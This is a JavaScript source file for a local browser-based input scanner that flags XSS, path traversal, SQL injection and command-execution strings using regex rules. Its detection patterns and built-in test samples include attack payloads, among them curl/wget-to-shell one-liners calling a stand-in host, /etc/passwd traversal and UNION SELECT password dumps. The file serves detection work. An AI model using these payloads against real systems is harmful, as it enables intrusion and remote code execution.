/* =========================
   Validoon — Final MVP (local-only)
   Drop-in replacement app.js
   Adds: Normalize → Re-detect (fixes %2f LFI false-negative)
   Also: defensive DOM binding (prevents addEventListener null errors)
   ========================= */

(() => {
  "use strict";

  const BUILD = "v2026-01-03_final_mvp_normlayer";

  /* ---------- DOM helpers (robust binding) ---------- */
  function $(...selectors) {
    for (const s of selectors) {
      const el = document.querySelector(s);
      if (el) return el;
    }
    return null;
  }

  function setText(el, txt) {
    if (el) el.textContent = String(txt);
  }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  /* ---------- Normalize layer (the main fix) ---------- */
  function safeDecodeURIComponent(str) {
    try {
      return decodeURIComponent(str);
    } catch {
      // If malformed %, decode safely by replacing invalid sequences
      return str.replace(/%(?![0-9A-Fa-f]{2})/g, "%25");
    }
  }

  function normalizeInput(raw) {
    let s = String(raw ?? "");

    // 1) trim
    s = s.trim();

    // 2) remove invisible / control chars (keep newline out; single-line inputs anyway)
    s = s.replace(/[\u0000-\u001F\u007F\u200B-\u200F\u202A-\u202E\u2060\uFEFF]/g, "");

    // 3) lower
    s = s.toLowerCase();

    // 4) decode URL-encoding up to 2 passes (enough for common obfuscation)
    for (let i = 0; i < 2; i++) {
      const d = safeDecodeURIComponent(s);
      if (d === s) break;
      s = d;
    }

    // 5) collapse spaces
    s = s.replace(/\s+/g, " ");

    return s;
  }

  /* ---------- Entropy (simple) ---------- */
  function shannonEntropy(str) {
    const s = String(str ?? "");
    if (!s.length) return 0;
    const freq = new Map();
    for (const ch of s) freq.set(ch, (freq.get(ch) || 0) + 1);
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / s.length;
      ent -= p * Math.log2(p);
    }
    return Number(ent.toFixed(2));
  }

  /* ---------- Detection rules (local, deterministic) ---------- */
  const RULES = [
    // Redirect params (risk indicator)
    {
      label: "REDIRECT_PARAM",
      test: (s) =>
        /(?:\bredirect_uri\b|\breturnurl\b|\breturn_url\b|\bnext\b|\burl\b)\s*=\s*(?:https?:|\/\/|javascript:)/i.test(s),
      sev: 55,
      conf: 90,
      typeHint: "URL",
    },

    // XSS / JS scheme / inline script vectors
    {
      label: "XSS/JS_SCRIPT",
      test: (s) =>
        /\bjavascript\s*:/i.test(s) ||
        /<\s*script\b/i.test(s) ||
        /onerror\s*=/i.test(s) ||
        /onload\s*=/i.test(s) ||
        /<\s*svg\b/i.test(s) ||
        /<\s*img\b/i.test(s),
      sev: 85,
      conf: 85,
      typeHint: "Exploit",
    },

    // data:text/html;base64,...
    // IMPORTANT: do NOT label as CMD; just mark as base64+obfuscation then elevate via XSS if html
    {
      label: "BASE64_DECODE",
      test: (s) => /\bbase64\b/i.test(s) || /data\s*:\s*text\/html\s*;?\s*base64/i.test(s),
      sev: 35,
      conf: 70,
      typeHint: "Data",
    },

    // Obfuscation indicators (encoded traversal, long tokens, mixed separators)
    {
      label: "OBFUSCATION",
      test: (s) =>
        /%2f|%5c|%3a|%3b|%0a|%0d/i.test(s) ||
        /[a-z0-9+\/]{40,}={0,2}/i.test(s) ||
        /(?:\.\.\/){2,}|(?:\.\.\\){2,}/i.test(s),
      sev: 35,
      conf: 67,
      typeHint: "Data",
    },

    // LFI: /etc/passwd, windows hosts (NOW catches %2f because we normalized)
    {
      label: "LFI:ETC_PASSWD",
      test: (s) =>
        /(?:\.\.\/){2,}etc\/passwd/i.test(s) ||
        /etc\/passwd/i.test(s) ||
        /windows\\system32\\drivers\\etc\\hosts/i.test(s) ||
        /system32\\drivers\\etc\\hosts/i.test(s),
      sev: 80,
      conf: 75,
      typeHint: "Exploit",
    },

    // SQLi tautology / comment
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: (s) =>
        /\b(or|and)\b\s+1\s*=\s*1\b/i.test(s) ||
        /'\s*or\s*'1'\s*=\s*'1/i.test(s) ||
        /admin'\s*--/i.test(s) ||
        /\bselect\b.+\bfrom\b.+\bwhere\b/i.test(s) && /\b(or|and)\b/i.test(s) && /=/i.test(s),
      sev: 75,
      conf: 85,
      typeHint: "Exploit",
    },

    // SQLi UNION (treat as high risk)
    {
      label: "SQL:SQLI_UNION_ALL",
      test: (s) => /\bunion\b\s+\bselect\b/i.test(s),
      sev: 80,
      conf: 80,
      typeHint: "Exploit",
    },

    // CMD chain indicators
    {
      label: "CMD:CMD_CHAIN",
      test: (s) => /(&&|\|\||;\s*)(?:\w+)/i.test(s) || /\b(powershell\s+-enc|cmd\.exe|\/bin\/sh|bash)\b/i.test(s),
      sev: 85,
      conf: 85,
      typeHint: "Exploit",
    },

    // Download-to-exec
    {
      label: "DOWNLOAD_TOOL",
      test: (s) =>
        /\b(curl|wget)\b/i.test(s) && /\b(sh|bash)\b/i.test(s) ||
        /\|\s*(sh|bash)\b/i.test(s) ||
        /\b(powershell)\b/i.test(s) && /\b(downloadstring|iex)\b/i.test(s),
      sev: 90,
      conf: 90,
      typeHint: "Exploit",
    },

    // Homograph / punycode
    {
      label: "HOMOGRAPH_RISK",
      test: (s) => /\bxn--/i.test(s),
      sev: 60,
      conf: 70,
      typeHint: "URL",
    },

    // Auth endpoints (risk context)
    {
      label: "AUTH_ENDPOINT",
      test: (s) =>
        /(oauth|authorize|signin|login)\b/i.test(s) &&
        /(accounts\.google\.com|login\.microsoftonline\.com|oauth|authorize)/i.test(s),
      sev: 45,
      conf: 80,
      typeHint: "URL",
    },

    // Download tool script tag (counts as XSS already; keep separate if present)
    {
      label: "DOWNLOAD_TOOL",
      test: (s) => /<\s*script\b[^>]*\bsrc\s*=\s*https?:\/\//i.test(s),
      sev: 90,
      conf: 90,
      typeHint: "Exploit",
    },
  ];

  function classifyType(raw) {
    const s = String(raw ?? "").trim();
    if (/^https?:\/\//i.test(s) || /^\/\//.test(s)) return "URL";
    if (/[<>"']/.test(s) || /\b(select|union|script|javascript:|onerror|onload)\b/i.test(s)) return "Exploit";
    return "Data";
  }

  function decide(hits) {
    let maxSev = 0;
    let maxConf = 0;
    for (const h of hits) {
      if (h.sev > maxSev) maxSev = h.sev;
      if (h.conf > maxConf) maxConf = h.conf;
    }

    // Decision thresholds (consistent with your MVP intent)
    let decision = "ALLOW";
    if (maxSev >= 85) decision = "BLOCK";
    else if (maxSev >= 55) decision = "WARN";

    return { decision, severity: maxSev, confidence: maxConf };
  }

  function scanOne(raw) {
    const norm = normalizeInput(raw);
    const hits = [];

    for (const r of RULES) {
      if (r.test(norm)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }

    // Elevation logic:
    // If it's a data:text/html;base64... it must be BLOCK (XSS-like) even if XSS rule didn’t catch
    if (/data\s*:\s*text\/html\s*;?\s*base64/i.test(norm)) {
      if (!hits.some((h) => h.label === "XSS/JS_SCRIPT")) hits.push({ label: "XSS/JS_SCRIPT", sev: 85, conf: 85 });
    }

    // If UNION SELECT appears, treat as BLOCK (stronger than WARN)
    if (/\bunion\b\s+\bselect\b/i.test(norm)) {
      // ensure rule present
      if (!hits.some((h) => h.label === "SQL:SQLI_UNION_ALL")) hits.push({ label: "SQL:SQLI_UNION_ALL", sev: 80, conf: 80 });
      // elevate via tautology-like severity if needed
      hits.push({ label: "SQL:SQLI_TAUTOLOGY", sev: 75, conf: 85 });
    }

    const { decision, severity, confidence } = decide(hits);

    return {
      input: String(raw),
      normalized: norm,
      type: classifyType(raw),
      decision,
      severity,
      confidence,
      entropy: shannonEntropy(raw),
      hits,
    };
  }

  function systemVerdict(peakSeverity, confidence) {
    if (peakSeverity >= 85) return { verdict: "DANGER", peakSeverity, confidence };
    if (peakSeverity >= 55) return { verdict: "SUSPICIOUS", peakSeverity, confidence };
    return { verdict: "CLEAN", peakSeverity, confidence };
  }

  /* ---------- Built-in tests ---------- */
  const TEST_A = [
    "hello world",
    "https://example.com/",
    "redirect_uri=https://evil.com",
  ].join("\n");

  const TEST_B = [
    "https://accounts.google.com/signin/oauth/authorize?redirect_uri=https://evl1.com",
    "<svg onload=alert(1)>",
    "<script>alert(1)</script>",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "UNION SELECT username,password FROM users",
    "&& curl http://evl1.tld/payload.sh | sh",
    "wget http://evl1.tld/a.sh -O- | sh",
    "curl -s http://evl1.tld/a | bash",
    "http://xn--pple-43d.com/login",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  ].join("\n");

  /* ---------- UI rendering ---------- */
  function pillClass(decision) {
    if (decision === "ALLOW") return "pill allow";
    if (decision === "WARN") return "pill warn";
    return "pill block";
  }

  function renderRows(rows, tbody) {
    if (!tbody) return;
    tbody.innerHTML = "";
    for (const r of rows) {
      const tr = document.createElement("tr");

      const tdType = document.createElement("td");
      tdType.textContent = r.type;

      const tdDecision = document.createElement("td");
      const pill = document.createElement("span");
      pill.className = pillClass(r.decision);
      pill.textContent = r.decision;
      tdDecision.appendChild(pill);

      const tdSev = document.createElement("td");
      tdSev.textContent = `${r.severity}%`;

      const tdConf = document.createElement("td");
      tdConf.textContent = `${r.confidence}%`;

      const tdEnt = document.createElement("td");
      tdEnt.textContent = r.entropy;

      const tdInput = document.createElement("td");
      tdInput.textContent = r.input;

      tr.appendChild(tdType);
      tr.appendChild(tdDecision);
      tr.appendChild(tdSev);
      tr.appendChild(tdConf);
      tr.appendChild(tdEnt);
      tr.appendChild(tdInput);

      tbody.appendChild(tr);
    }
  }

  function computeSignals(rows) {
    const map = new Map();
    for (const r of rows) {
      for (const h of r.hits) map.set(h.label, (map.get(h.label) || 0) + 1);
    }
    return Array.from(map.entries())
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));
  }

  function computeCounts(rows) {
    let allow = 0, warn = 0, block = 0;
    for (const r of rows) {
      if (r.decision === "ALLOW") allow++;
      else if (r.decision === "WARN") warn++;
      else block++;
    }
    return { scans: rows.length, allow, warn, block };
  }

  function peak(rows) {
    let peakSeverity = 0;
    let peakConfidence = 0;
    for (const r of rows) {
      if (r.severity > peakSeverity) peakSeverity = r.severity;
      if (r.confidence > peakConfidence) peakConfidence = r.confidence;
    }
    return { peakSeverity, peakConfidence };
  }

  function setVerdictUI(v) {
    const verdictEl = $("#verdictText", "#verdict", ".verdict-text");
    const sevEl = $("#peakSeverityText", "#peakSeverity", ".peak-severity");
    const confEl = $("#confidenceText", "#confidence", ".confidence");

    setText(verdictEl, v.verdict);
    setText(sevEl, `${v.peakSeverity}%`);
    setText(confEl, `${v.confidence}%`);

    // Optional styling hook
    const card = $("#verdictCard", ".verdict-card");
    if (card) {
      card.classList.remove("clean", "suspicious", "danger");
      card.classList.add(v.verdict === "DANGER" ? "danger" : v.verdict === "SUSPICIOUS" ? "suspicious" : "clean");
    }
  }

  function setCountsUI(c) {
    setText($("#countScans", ".count-scans"), c.scans);
    setText($("#countAllow", ".count-allow"), c.allow);
    setText($("#countWarn", ".count-warn"), c.warn);
    setText($("#countBlock", ".count-block"), c.block);
  }

  function setSignalsUI(signals) {
    const box = $("#signalsBox", "#activeSignals", ".signals");
    if (!box) return;
    box.innerHTML = "";
    for (const s of signals) {
      const chip = document.createElement("span");
      chip.className = "chip";
      chip.textContent = `${s.label} ×${s.count}`;
      box.appendChild(chip);
    }
  }

  /* ---------- Export JSON ---------- */
  function buildExport(rows) {
    const counts = computeCounts(rows);
    const signals = computeSignals(rows);
    const { peakSeverity, peakConfidence } = peak(rows);
    const v = systemVerdict(peakSeverity, peakConfidence);

    return {
      generatedAt: new Date().toISOString(),
      build: BUILD,
      verdict: v.verdict,
      peakSeverity: v.peakSeverity,
      confidence: v.confidence,
      counts,
      signals,
      rows: rows.map((r) => ({
        input: r.input,
        type: r.type,
        decision: r.decision,
        severity: r.severity,
        confidence: r.confidence,
        entropy: r.entropy,
        hits: r.hits,
      })),
    };
  }

  function downloadJson(obj) {
    const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.href = URL.createObjectURL(blob);
    a.download = `validoon_report_${ts}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(a.href), 1000);
  }

  /* ---------- Main actions ---------- */
  function getInputLines(textarea) {
    const raw = textarea ? textarea.value : "";
    return raw
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);
  }

  function runScan() {
    const inputEl = $("#inputStream", "#input", "textarea");
    const tbody = $("#findingsBody", "#resultsBody", "tbody");

    const lines = getInputLines(inputEl);
    const rows = lines.map(scanOne);

    const counts = computeCounts(rows);
    const signals = computeSignals(rows);
    const { peakSeverity, peakConfidence } = peak(rows);
    const v = systemVerdict(peakSeverity, peakConfidence);

    renderRows(rows, tbody);
    setCountsUI(counts);
    setSignalsUI(signals);
    setVerdictUI({ verdict: v.verdict, peakSeverity, confidence: peakConfidence });

    // Store last result for export
    window.__VALIDOON_LAST__ = rows;

    return rows;
  }

  function clearAll() {
    const inputEl = $("#inputStream", "#input", "textarea");
    if (inputEl) inputEl.value = "";

    const tbody = $("#findingsBody", "#resultsBody", "tbody");
    if (tbody) tbody.innerHTML = "";

    setCountsUI({ scans: 0, allow: 0, warn: 0, block: 0 });
    setSignalsUI([]);
    setVerdictUI({ verdict: "CLEAN", peakSeverity: 0, confidence: 0 });

    window.__VALIDOON_LAST__ = [];
  }

  function showInfo() {
    alert(
      [
        "Validoon — Final MVP (local-only)",
        `Build: ${BUILD}`,
        "",
        "What changed:",
        "- Normalize → Re-detect (catches encoded traversal like ..%2f..%2fetc%2fpasswd)",
        "- Defensive DOM binding (prevents addEventListener null errors)",
        "",
        "Privacy:",
        "- No network calls. No uploads.",
      ].join("\n")
    );
  }

  function loadTestA() {
    const inputEl = $("#inputStream", "#input", "textarea");
    if (inputEl) inputEl.value = TEST_A;
  }

  function loadTestB() {
    const inputEl = $("#inputStream", "#input", "textarea");
    if (inputEl) inputEl.value = TEST_B;
  }

  function exportJson() {
    const rows = Array.isArray(window.__VALIDOON_LAST__) ? window.__VALIDOON_LAST__ : [];
    const obj = buildExport(rows);
    downloadJson(obj);
  }

  /* ---------- Boot ---------- */
  function boot() {
    // Buttons (try multiple ids/classes to match your HTML)
    const btnA = $("#btnLoadA", "#loadA", "button[data-action='loadA']", "button:nth-of-type(1)");
    const btnB = $("#btnLoadB", "#loadB", "button[data-action='loadB']");
    const btnScan = $("#btnScan", "#executeScan", "button[data-action='scan']");
    const btnExport = $("#btnExport", "#exportJson", "button[data-action='export']");
    const btnInfo = $("#btnInfo", "#infoBtn", "button[data-action='info']");
    const btnClear = $("#btnClear", "#clearBtn", "button[data-action='clear']");

    // Safe bindings
    safeOn(btnA, "click", () => loadTestA());
    safeOn(btnB, "click", () => loadTestB());
    safeOn(btnScan, "click", () => runScan());
    safeOn(btnExport, "click", () => exportJson());
    safeOn(btnInfo, "click", () => showInfo());
    safeOn(btnClear, "click", () => clearAll());

    // Initial UI state
    window.__VALIDOON_LAST__ = [];
    setCountsUI({ scans: 0, allow: 0, warn: 0, block: 0 });
    setSignalsUI([]);
    setVerdictUI({ verdict: "CLEAN", peakSeverity: 0, confidence: 0 });

    console.log(`[validoon] ${BUILD} loaded. Local-only. No network.`);
  }

  // Ensure DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
